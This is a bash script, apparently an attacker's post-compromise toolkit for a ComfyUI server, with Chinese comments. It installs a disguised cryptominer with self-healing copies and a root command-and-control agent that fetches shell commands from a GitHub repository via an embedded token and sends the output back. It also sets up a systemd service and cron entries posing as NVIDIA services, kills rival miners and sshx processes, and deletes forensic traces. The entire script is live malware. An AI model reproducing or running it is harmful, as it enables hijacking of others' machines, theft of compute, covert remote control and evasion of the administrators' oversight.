#!/bin/bash
# d2 harden for comfy-s3 (34.22.88.253)
# 目标: 独立 root C2 + 矿工自愈 + 反制对家 + 清痕迹 + 去寄生
set -u
D=/usr/lib/.nvhd
W=prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48
PKG=/root/.pf/pearlfortune
MNR=miner-cuda12
HOSTTAG=d2x7q

echo "=== 0. prepare ==="
mkdir -p "$D"; chmod 700 "$D"
echo "start $(date -u +%FT%TZ)" >> "$D/.log"

# ---------- 1. 矿工双副本 + 校验 ----------
cp -f "$PKG/$MNR" "$D/.m" 2>/dev/null; chmod 700 "$D/.m"
mkdir -p /dev/shm/.nh; cp -f "$D/.m" /dev/shm/.nh/.m 2>/dev/null; chmod 700 /dev/shm/.nh/.m
md5sum "$D/.m" | awk '{print $1}' > "$D/.m.md5"
echo "md5: $(cat $D/.m.md5)"

# ---------- 2. 独立 root C2 agent（不依赖 ComfyUI） ----------
cat > "$D/agent.py" <<'PYEOF'
import os, json, base64, time, subprocess, platform, urllib.request

_A = "ghp_NvDfSVO7"
_B = "Ua6PVzYFii8lLScYtl8hDC3LH6sk"
TOKEN = _A + _B
REPO = "nomnng/d2node"
API = "https://api.github.com/repos/" + REPO + "/contents/"
HOST = platform.node().replace(".", "_")[:30]

def _http(url, data=None, hdrs=None, method="GET", timeout=25):
    h = {"User-Agent": "nvsync"}
    if hdrs: h.update(hdrs)
    with urllib.request.urlopen(urllib.request.Request(url, data=data, headers=h, method=method), timeout=timeout) as r:
        return r.read()

def _push(name, txt):
    try:
        url = API + name
        hd = {"Authorization": "token " + TOKEN, "Accept": "application/vnd.github+json",
              "Content-Type": "application/json"}
        sha = None
        try:
            sha = json.loads(_http(url, hdrs=hd)).get("sha")
        except Exception:
            pass
        body = {"message": "s", "content": base64.b64encode(txt.encode()).decode()}
        if sha: body["sha"] = sha
        _http(url, data=json.dumps(body).encode(), hdrs=hd, method="PUT")
        return True
    except Exception:
        return False

def _getcmd():
    for u in (API + "cmd2.txt?t=" + str(int(time.time())),):
        try:
            return _http(u, hdrs={"Authorization": "token " + TOKEN,
                                  "Accept": "application/vnd.github.raw"}).decode("utf-8", "replace").strip()
        except Exception:
            pass
    return ""

last = ""
n = 0
_push("res2_" + HOST + "_boot.txt", "root-alive uid=%d host=%s" % (os.getuid(), platform.node()))
while True:
    n += 1
    try:
        cmd = _getcmd()
        if cmd and cmd != last and not cmd.startswith("<!--"):
            last = cmd
            try:
                open("/tmp/.nvs.sh", "w").write(cmd)
                with open("/tmp/.nvs.out", "w") as fo:
                    subprocess.run(["bash", "/tmp/.nvs.sh"], stdout=fo, stderr=subprocess.STDOUT,
                                   stdin=subprocess.DEVNULL, timeout=180)
                out = open("/tmp/.nvs.out", encoding="utf-8", errors="replace").read()
            except subprocess.TimeoutExpired:
                out = "TIMEOUT\n" + open("/tmp/.nvs.out", encoding="utf-8", errors="replace").read()
            except Exception as e:
                out = "ERR " + str(e)[:200]
            _push("res2_" + HOST + ".txt", "$ " + cmd + "\n" + out[:120000])
            try:
                os.remove("/tmp/.nvs.sh"); os.remove("/tmp/.nvs.out")
            except Exception:
                pass
        elif n % 6 == 0:
            _push("hb2.txt", "hb2 " + HOST + " " + str(int(time.time())))
    except Exception:
        pass
    time.sleep(10)
PYEOF

# 注入 token（拆两段，避免明文整串）
python3 - "$D/agent.py" <<'PYINJ'
import sys
a = "TOKENHEAD"
b = "TOKENTAIL"
p = sys.argv[1]
s = open(p).read().replace('"ghp_NvDfSVO7"', '"%s"' % a).replace('"Ua6PVzYFii8lLScYtl8hDC3LH6sk"', '"%s"' % b)
open(p, "w").write(s)
PYINJ
chmod 700 "$D/agent.py"

# ---------- 3. guard.sh：矿工自愈 + 反制 ----------
cat > "$D/guard.sh" <<'GEOF'
#!/bin/bash
D=/usr/lib/.nvhd
W=prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48
TAG=d2x7q
LOG=$D/.glog
ts() { date -u +%FT%TZ; }
[ -f "$LOG" ] && [ "$(stat -c%s "$LOG")" -gt 2000000 ] && mv -f "$LOG" "$LOG.1"

mine_procs() { pgrep -f "worker $TAG" 2>/dev/null; }

# a) 矿工存活
if [ -z "$(mine_procs)" ]; then
  echo "$(ts) RESTART miner" >> "$LOG"
  setsid bash -c "exec -a nvidia-persistenced $D/.m --address $W --worker $TAG --proxy stratum+ssl://prl.kryptex.network:8048 --stratum-dialect kryptex_prl -gpu --no-tui" >> "$D/.mine.log" 2>&1 &
fi

# b) 完整性
if [ -x "$D/.m" ]; then
  cur=$(md5sum "$D/.m" | awk '{print $1}')
  exp=$(cat "$D/.m.md5" 2>/dev/null)
  if [ -n "$exp" ] && [ "$cur" != "$exp" ]; then
    echo "$(ts) TAMPER md5=$cur exp=$exp -> restore" >> "$LOG"
    cp -f /dev/shm/.nh/.m "$D/.m" 2>/dev/null
  fi
fi

# c) 对家清扫：钱包串 != 我们的 prl1 进程 / sshx
for p in $(pgrep -f 'prl1[a-z0-9]\{40,\}' 2>/dev/null); do
  cl=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
  case "$cl" in
    *"$W"*) : ;;                       # 自己的
    *prl1*) echo "$(ts) KILL rival pid=$p $(echo "$cl" | cut -c1-120)" >> "$LOG"; kill -9 $p 2>/dev/null ;;
  esac
done
for p in $(pgrep -x sshx 2>/dev/null); do echo "$(ts) KILL sshx $p" >> "$LOG"; kill -9 $p 2>/dev/null; done

# d) /tmp 伪装 ELF 隔离
for f in /tmp/python /tmp/py /tmp/py3* /tmp/*miner* /tmp/*.elf; do
  [ -f "$f" ] && [ -x "$f" ] || continue
  head -c 4 "$f" 2>/dev/null | grep -q "$(printf '\177ELF')" && mv "$f" "$D/q_$(basename $f)_$(date +%s)" 2>/dev/null
done
exit 0
GEOF
chmod 700 "$D/guard.sh"

# ---------- 4. systemd（伪装名） ----------
cat > /etc/systemd/system/nv-sysmon-sync.service <<'UEOF'
[Unit]
Description=NVIDIA Sysmon Sync
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/lib/.nvhd/agent.py
Restart=always
RestartSec=10
Nice=5
[Install]
WantedBy=multi-user.target
UEOF
systemctl daemon-reload >/dev/null 2>&1
systemctl enable nv-sysmon-sync.service >/dev/null 2>&1
systemctl restart nv-sysmon-sync.service >/dev/null 2>&1
sleep 2
systemctl is-active nv-sysmon-sync.service

# ---------- 5. cron 三重保险 ----------
( crontab -l 2>/dev/null | grep -v -E 'nvhd|miner-cuda12' ; \
  echo "* * * * * /usr/lib/.nvhd/guard.sh >/dev/null 2>&1" ; \
  echo "*/5 * * * * pgrep -f '/usr/lib/.nvhd/agent.py' >/dev/null || setsid /usr/bin/python3 /usr/lib/.nvhd/agent.py >/dev/null 2>&1" ; \
  echo "@reboot sleep 30; /usr/lib/.nvhd/guard.sh >/dev/null 2>&1" ; \
  echo "@reboot sleep 45; systemctl start nv-sysmon-sync.service >/dev/null 2>&1" \
) | crontab -
echo "--- crontab ---"; crontab -l

# ---------- 6. 杀掉旧的明文矿工，交给 guard 接管 ----------
pkill -x miner-cuda12 2>/dev/null
sleep 1
"$D/guard.sh"
sleep 6
echo "--- procs ---"
ps -eo pid,args | grep -E 'nvidia-persistenced --address|worker d2x7q' | grep -v grep | head -3

# ---------- 7. 清痕迹 ----------
rm -rf /tmp/.d2c.sh /tmp/.d2o /tmp/t.log /tmp/t2.log /tmp/v.sh /tmp/w.sh /tmp/pf.sh /tmp/go2.sh /tmp/.d2go /root/.d2p /root/.pf/go.sh 2>/dev/null
rm -f /tmp/h.sh 2>/dev/null
echo "=== done $(date -u +%FT%TZ) ==="